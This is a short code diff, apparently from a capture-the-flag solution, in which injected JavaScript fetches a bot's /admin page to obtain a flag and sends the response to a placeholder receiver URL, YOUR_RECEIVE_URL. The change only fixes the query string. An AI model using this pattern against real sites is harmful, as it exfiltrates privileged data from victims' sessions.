@@ -14,7 +14,7 @@
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
     fetch('/admin')
         .then(res => {
-            fetch(YOUR_RECEIVE_URL+'res='+res);
+            fetch(YOUR_RECEIVE_URL+'?res='+res);
             if (res.ok){ 
              
                 fetch(YOUR_RECEIVE_URL+'?json='+res.json());
